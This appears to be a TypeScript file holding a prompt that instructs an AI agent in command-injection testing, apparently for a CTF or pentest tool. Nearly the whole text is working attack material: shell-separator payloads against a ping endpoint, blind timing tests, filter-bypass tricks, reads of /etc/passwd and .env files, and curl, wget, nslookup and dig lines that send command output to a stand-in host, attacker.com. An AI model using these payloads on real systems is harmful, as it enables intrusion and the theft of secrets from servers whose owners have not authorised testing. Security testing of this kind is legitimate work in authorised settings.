/**
 * Command Injection testing methodology
 */

export const COMMAND_INJECTION_TESTING_PROMPT = `
# Command Injection Testing Methodology

You are testing for OS Command Injection / Remote Code Execution (RCE) vulnerabilities.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., reading the flag file, executing commands, exfiltrating data).

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Demonstrate command execution** - Show actual command output (whoami, id, file contents)

## Testing Approach

### Step 1: Authentication (if required)

\`\`\`bash
# Authenticate and save session
curl -s -c cookies.txt -X POST "\$TARGET/login" \\
  -d "username=\$USER&password=\$PASS"

SESSION=\$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')
\`\`\`

### Step 2: Command Separator Testing (PortSwigger Best Practice)

**Cross-Platform Separators:**

| Separator | Behavior | Example |
|-----------|----------|---------|
| \`&\` | Background (both execute) | \`127.0.0.1 & whoami\` |
| \`&&\` | AND (second if first succeeds) | \`127.0.0.1 && whoami\` |
| \`|\` | Pipe (output to input) | \`127.0.0.1 | whoami\` |
| \`||\` | OR (second if first fails) | \`invalid || whoami\` |

**Unix-Only Separators:**

| Separator | Behavior | Example |
|-----------|----------|---------|
| \`;\` | Sequential | \`127.0.0.1; whoami\` |
| Newline | Sequential | \`127.0.0.1%0awhoami\` |
| Backticks | Inline substitution | \`127.0.0.1\\\`whoami\\\`\` |
| \`\$()\` | Inline substitution | \`127.0.0.1\$(whoami)\` |

\`\`\`bash
# Test all separator techniques
separators=(
  "; whoami"         # Unix sequential
  "| whoami"         # Pipe
  "& whoami"         # Background
  "&& whoami"        # AND conditional
  "|| whoami"        # OR conditional
  "\\\`whoami\\\`"   # Backtick substitution
  "\$(whoami)"       # Command substitution
)

for sep in "\${separators[@]}"; do
  encoded=\$(echo -n "127.0.0.1\$sep" | jq -sRr @uri)
  response=\$(curl -s "\$TARGET/ping?host=\$encoded")

  if echo "\$response" | grep -qiE "root|www-data|nginx|ubuntu|daemon"; then
    echo "[+] Command injection via: \$sep"
  fi
done
\`\`\`

#### Newline Injection
\`\`\`bash
# Unix newline
curl -s "\$TARGET/ping?host=127.0.0.1%0awhoami"

# Carriage return + newline
curl -s "\$TARGET/ping?host=127.0.0.1%0d%0awhoami"
\`\`\`

### Step 3: Blind Detection via Time Delays

**When command output is not visible, use timing:**

\`\`\`bash
# Unix - ping delay
START=\$(date +%s)
curl -s "\$TARGET/ping?host=127.0.0.1%26ping+-c+10+127.0.0.1%26"
END=\$(date +%s)
if [ \$((END - START)) -ge 8 ]; then
  echo "[+] Time-based command injection confirmed"
fi

# Unix - sleep command
curl -s "\$TARGET/ping?host=127.0.0.1%26sleep+10%26"

# Windows - timeout
curl -s "\$TARGET/ping?host=127.0.0.1%26+timeout+/T+10"
\`\`\`

**CRITICAL: Always compare with baseline (no injection) to confirm timing difference.**

### Step 4: Output Redirection (Blind Injection)

When output is not returned, redirect to web-accessible path:

\`\`\`bash
# Redirect output to web root
curl -s "\$TARGET/ping?host=127.0.0.1%26whoami+>+/var/www/static/whoami.txt%26"

# Retrieve the file
curl -s "\$TARGET/static/whoami.txt"
\`\`\`

### Step 5: Out-of-Band (OAST) Techniques

**DNS Exfiltration:**
\`\`\`bash
# Basic DNS callback confirmation
curl -s "\$TARGET/ping?host=127.0.0.1%26nslookup+attacker.com%26"

# Data exfiltration via DNS subdomain
curl -s "\$TARGET/ping?host=127.0.0.1%26nslookup+\\\`whoami\\\`.attacker.com%26"

# Using dig
curl -s "\$TARGET/ping?host=127.0.0.1%26dig+\\\`id|base64\\\`.attacker.com%26"
\`\`\`

**HTTP Callback:**
\`\`\`bash
# Basic HTTP callback
curl -s "\$TARGET/ping?host=127.0.0.1%26curl+http://attacker.com/callback%26"

# Data exfiltration via HTTP
curl -s "\$TARGET/ping?host=127.0.0.1%26curl+http://attacker.com/\\\`whoami\\\`%26"

# Using wget
curl -s "\$TARGET/ping?host=127.0.0.1%26wget+http://attacker.com/\\\`id\\\`%26"
\`\`\`

### Step 6: Filter Bypass Techniques

**Space Alternatives:**
\`\`\`bash
# IFS (Internal Field Separator)
curl -s "\$TARGET/ping?host=127.0.0.1;cat\${IFS}/etc/passwd"

# Tab character
curl -s "\$TARGET/ping?host=127.0.0.1;cat%09/etc/passwd"

# Input redirection (no space needed)
curl -s "\$TARGET/ping?host=127.0.0.1;cat</etc/passwd"

# Brace expansion
curl -s "\$TARGET/ping?host=127.0.0.1;{cat,/etc/passwd}"
\`\`\`

**Character Encoding:**
\`\`\`bash
# URL encoding
curl -s "\$TARGET/ping?host=127.0.0.1%3Bwhoami"  # ; = %3B

# Double URL encoding
curl -s "\$TARGET/ping?host=127.0.0.1%253Bwhoami"  # %3B = %253B
\`\`\`

**Bypass Blacklisted Commands:**
\`\`\`bash
# Concatenation
curl -s "\$TARGET/ping?host=127.0.0.1;wh\$()oami"
curl -s "\$TARGET/ping?host=127.0.0.1;wh''oami"
curl -s "\$TARGET/ping?host=127.0.0.1;w\"h\"oami"

# Variable substitution
curl -s "\$TARGET/ping?host=127.0.0.1;\$PATH/../../../../bin/whoami"

# Wildcard
curl -s "\$TARGET/ping?host=127.0.0.1;/bin/wh?ami"
curl -s "\$TARGET/ping?host=127.0.0.1;/bin/who*"
\`\`\`

### Step 7: Data Exfiltration

Once command execution is confirmed, read target files:

\`\`\`bash
# Read sensitive files
targets=("/etc/passwd" "/flag.txt" "/app/config.php" "/app/.env")
for file in "\${targets[@]}"; do
  curl -s "\$TARGET/ping?host=127.0.0.1;cat+\$file"
done
\`\`\`

### Step 8: Document Working Technique

\`\`\`bash
#!/bin/bash
# POC: Command Injection in [Endpoint]
# Objective: [Session goal - read flag, exfiltrate data]

TARGET="[TARGET_URL]"

# STEP 1: AUTHENTICATION
SESSION="[SESSION_COOKIE]"
AUTH_HEADER="Cookie: \${SESSION}"

# STEP 2: EXPLOITATION
# The injection technique that worked:
INJECTION="; cat /flag.txt"
ENCODED=\$(echo -n "127.0.0.1\$INJECTION" | jq -sRr @uri)

curl -s -H "\$AUTH_HEADER" "\$TARGET/ping?host=\$ENCODED"

# STEP 3: OBJECTIVE
echo "[*] Flag/data retrieved"
\`\`\`

## Injection Techniques Reference

| Technique | Payload | Platform |
|-----------|---------|----------|
| Semicolon | \`; whoami\` | Unix only |
| Pipe | \`| whoami\` | Both |
| AND | \`&& whoami\` | Both |
| OR | \`|| whoami\` | Both |
| Background | \`& whoami\` | Both |
| Backticks | \`\\\`whoami\\\`\` | Unix only |
| Substitution | \`\$(whoami)\` | Unix only |
| Newline | \`%0awhoami\` | Unix only |

## Evidence Validation Checkpoint

**BEFORE documenting findings, verify you have AT LEAST ONE of:**
- Command output visible in response (id, whoami, hostname, uname)
- File created/modified by injected command (with verification)
- Time delay from sleep/timeout/ping (WITH control comparison - baseline vs injected)
- Out-of-band callback (DNS, HTTP) triggered with unique identifier
- Blind injection confirmed via output redirection to web-accessible path

**NOT EVIDENCE (do not report these alone):**
- Error message mentioning command
- Application crash without output
- HTTP 500 status alone
- Timeout without control comparison
- "Command not found" error (might just be input reaching shell)

## Success Criteria

A valid command injection finding must demonstrate:

1. **Authentication handled** - Session established if needed
2. **Command execution confirmed** - whoami, id, or similar output (or timing/OOB proof)
3. **Data exfiltration shown** - Sensitive file contents retrieved
4. **Working payload** - The exact injection that works
5. **Objective progress** - Contribution to session goal (flag, data)

## Remember

- **Test all separator types** - Unix-only separators won't work on Windows
- **Blind injection requires proof** - Use timing WITH baseline, or OOB callbacks
- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Show actual command output** - not just HTTP 200 status
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
